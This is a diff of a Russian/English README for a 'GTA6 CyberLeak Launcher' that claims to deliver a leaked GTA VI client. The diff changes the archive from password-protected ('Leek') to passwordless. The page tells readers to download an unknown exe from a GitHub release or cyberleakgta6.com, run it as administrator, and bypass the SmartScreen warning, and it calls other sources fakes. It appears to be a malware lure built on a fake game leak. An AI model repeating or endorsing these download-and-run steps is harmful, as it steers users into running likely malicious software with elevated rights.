@@ -1,7 +1,7 @@
 # Скачать GTA6_CyberLeak_Launcher — лаунчер ГТА 6 CyberLeak / киберлик (Windows)
 
 [![Download ZIP](https://img.shields.io/badge/Download-GTA6_CyberLeak_Launcher.zip-ff4da6?style=for-the-badge)](https://github.com/FoxyYT1/GTA6-CyberLeak-Launcher/releases/download/123/GTA6_CyberLeak_Launcher.zip)
-[![ZIP password](https://img.shields.io/badge/ZIP_password-Leek-fcaf17?style=for-the-badge)](https://cyberleakgta6.com/launcher.html)
+[![ZIP](https://img.shields.io/badge/ZIP-no_password-fcaf17?style=for-the-badge)](https://cyberleakgta6.com/launcher.html)
 [![Site](https://img.shields.io/badge/Site-cyberleakgta6.com-111111?style=for-the-badge)](https://cyberleakgta6.com/)
 [![Support](https://img.shields.io/badge/Telegram-CyberLeakSupp__bot-26A5E4?style=for-the-badge)](https://t.me/CyberLeakSupp_bot)
 
@@ -18,7 +18,7 @@
 Not affiliated with Rockstar / Take-Two. Retail GTA VI: **19 November 2026**.
 
 1. Download **[GTA6_CyberLeak_Launcher.zip](https://github.com/FoxyYT1/GTA6-CyberLeak-Launcher/releases/download/123/GTA6_CyberLeak_Launcher.zip)** (or the site 302: [cyberleakgta6.com/download/GTA6_CyberLeak_Launcher.zip](https://cyberleakgta6.com/download/GTA6_CyberLeak_Launcher.zip)).
-2. Unzip with password **`Leek`** (case-sensitive) via 7-Zip, WinRAR, or Windows Extract All.
+2. Unzip — no password via 7-Zip, WinRAR, or Windows Extract All.
 3. Right-click `GTA6_CyberLeak_Launcher.exe` → **Run as administrator**.
 4. SmartScreen → More info → Run anyway.
 5. Keep **~130 GB** free on an SSD. Press **DOWNLOAD**, wait to 100% (hours; pause is OK).
@@ -42,15 +42,14 @@ EN guides: [download build](https://cyberleakgta6.com/en/download-gta-6-build.ht
 | Поддержка | [t.me/CyberLeakSupp_bot](https://t.me/CyberLeakSupp_bot) |
 | Канал | [t.me/CyberLeakVI](https://t.me/CyberLeakVI) |
 
-Имя файла **только** `GTA6_CyberLeak_Launcher.zip` (~70 МБ). **Пароль ZIP: `Leek`**. Внутри — `GTA6_CyberLeak_Launcher.exe` (Windows 10/11 x64).
+Имя файла **только** `GTA6_CyberLeak_Launcher.zip` (~70 МБ). **ZIP без пароля**. Внутри — `GTA6_CyberLeak_Launcher.exe` (Windows 10/11 x64).
 
-### Пароль архива
+### Архив
 
 | | |
 |---|---|
-| Password | **`Leek`** |
-| Регистр | важен |
-| Фейки | другой пароль, «в Telegram», MEGA/MediaFire «полный ISO 113 ГБ» |
+| Password | none |
+| Фейки | ZIP с паролем, «пароль в Telegram», MEGA/MediaFire «полный ISO 113 ГБ» |
 
 ---
 
@@ -58,7 +57,7 @@ EN guides: [download build](https://cyberleakgta6.com/en/download-gta-6-build.ht
 
 1. Только **Windows 10/11 x64**. Не Android, не APK, не телефон.
 2. Скачайте ZIP с **этого релиза** или с **cyberleakgta6.com** (без опечаток в домене).
-3. Распакуйте: 7-Zip / WinRAR / «Извлечь всё» → пароль **`Leek`**.
+3. Распакуйте: 7-Zip / WinRAR / «Извлечь всё» → без пароля.
 4. ПКМ по exe → **от имени администратора**.
 5. SmartScreen: **Подробнее** → **Выполнить в любом случае**.
 6. Папка установки с **130+ ГБ** на SSD.
@@ -104,7 +103,7 @@ EN guides: [download build](https://cyberleakgta6.com/en/download-gta-6-build.ht
 
 **Почему 113 ГБ?** Размер **клиента внутри лаунчера**, не отдельный торрент.
 
-**Почему ZIP с паролем?** Чтобы зеркала не подменяли архив. Канон только **`Leek`**.
+**ZIP без пароля.** Канон только cyberleakgta6.com / GitHub FoxyYT1.
 
 **Телефон?** Нет. Только PC Windows x64.
 
@@ -122,7 +121,7 @@ EN guides: [download build](https://cyberleakgta6.com/en/download-gta-6-build.ht
 
 **Official Rockstar build?** No.  
 **File name?** `GTA6_CyberLeak_Launcher.zip`  
-**ZIP password?** `Leek`  
+**ZIP password?** none  
 **Launcher size?** ~70 MB. **Client?** ~113 GB inside the app.  
 **SSD?** ~130 GB free.  
 **Fakes?** Torrents, APK, MEGA “full game”, Telegram “ISO”, random GitHub orgs.  
